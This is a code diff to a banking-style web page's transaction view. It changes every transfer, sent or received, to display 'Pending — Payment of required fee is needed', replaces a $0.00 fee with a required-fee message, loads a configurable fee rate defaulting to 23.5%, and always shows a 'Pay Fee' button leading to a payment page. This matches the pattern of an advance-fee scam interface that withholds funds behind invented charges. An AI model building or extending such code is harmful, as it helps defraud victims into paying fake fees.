@@ -124,7 +124,7 @@
         </div>
         <div class="detail">
           <div class="label">Fees</div>
-          <div class="value" id="feesValue">$0.00</div>
+          <div class="value" id="feesValue">Fee required to complete the transfer</div>
         </div>
       </div>
 
@@ -138,11 +138,12 @@
   <script src="config.js"></script>
   <script src="common.js"></script>
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
+    document.addEventListener("DOMContentLoaded", async () => {
       if (window.Notifications) window.Notifications.init();
       try {
         const user = JSON.parse(localStorage.getItem("bs-user"));
         if (!user || !user.token) { window.location.href = "login.html"; return; }
+        await loadSettings();
         loadAllTransactions();
       } catch (err) {
         console.error("Transactions init error:", err);
@@ -152,6 +153,18 @@
 
     const nameCache = new Map();
     let allTxs = [];
+    let feeRate = 0.235;
+
+    async function loadSettings(){
+      try{
+        const res = await fetch(`${window.API_BASE}/settings`);
+        const data = await res.json().catch(()=> ({}));
+        if (res.ok && data?.feeRate != null) {
+          const rate = Number(data.feeRate);
+          if (Number.isFinite(rate)) feeRate = rate;
+        }
+      } catch {}
+    }
 
     async function lookupName(email, token){
       try{
@@ -240,40 +253,29 @@
       actionsDiv.innerHTML = ""; // reset actions per selection
 
       const amt = Number(tx.amount) || 0;
-      const fees = amt * 0.235;
+      const fees = amt * feeRate;
 
   // Sender/receiver relative to current user (fallback to tx.type when emails are absent)
   const txType = (tx.type || '').toLowerCase();
   const isSender = ((tx.sender_email || '').toLowerCase() === currentEmail) || txType === 'debit';
   const isReceiver = ((tx.recipient_email || '').toLowerCase() === currentEmail) || txType === 'credit';
 
-      // Status visuals
+      // Status visuals (always pending with fee required)
       let statusText = '';
       statusBanner.style.display = 'flex';
-      if (isSender) {
-        statusBanner.className = "banner ok";
-        statusBanner.innerHTML = `<div class="icon">✔</div><div>Transfer Completed Successfully</div>`;
-        statusPill.className = "status-pill completed";
-        statusText = "Completed";
-      } else if (isReceiver) {
-        statusBanner.className = "banner warn";
-        statusBanner.innerHTML = `<div class="icon">⏱</div><div>Pending — Payment of required fee is needed to complete this transaction</div>`;
-        statusPill.className = "status-pill pending";
-        statusText = "Pending (Fee Required)";
-        const payBtn = document.createElement("button");
-        payBtn.className = "btn btn-primary";
-        payBtn.textContent = `Pay Fee ($${fees.toFixed(2)})`;
-        payBtn.onclick = () => {
-          localStorage.setItem("pending-fee", JSON.stringify({ amount: fees, originalTx: tx }));
-          window.location.href = "pay-fee.html";
-        };
-        actionsDiv.appendChild(payBtn);
-      } else {
-        statusBanner.className = "banner warn";
-        statusBanner.innerHTML = `<div class="icon">⏱</div><div>Transaction in review</div>`;
-        statusPill.className = "status-pill pending";
-        statusText = "Review";
-      }
+      statusBanner.className = "banner warn";
+      statusBanner.innerHTML = `<div class="icon">⏱</div><div>Pending — Payment of required fee is needed to complete this transaction</div>`;
+      statusPill.className = "status-pill pending";
+      statusText = "Pending (Fee Required)";
+
+      const payBtn = document.createElement("button");
+      payBtn.className = "btn btn-primary";
+      payBtn.textContent = `Pay Fee ($${fees.toFixed(2)})`;
+      payBtn.onclick = () => {
+        localStorage.setItem("pending-fee", JSON.stringify({ amount: fees, originalTx: tx }));
+        window.location.href = "pay-fee.html";
+      };
+      actionsDiv.appendChild(payBtn);
       statusPill.textContent = statusText;
 
       // Amount
@@ -324,7 +326,7 @@
       document.getElementById("toValue").textContent = toDisplay;
 
       // Description with status context
-      const descStatus = isSender ? "Transfer Completed" : (isReceiver ? "Transfer Pending (Fee Required)" : "Transfer In Review");
+      const descStatus = "Transfer Pending (Fee Required)";
       document.getElementById("descriptionValue").textContent = tx.description ? `${tx.description} — ${descStatus}` : descStatus;
 
       // Details
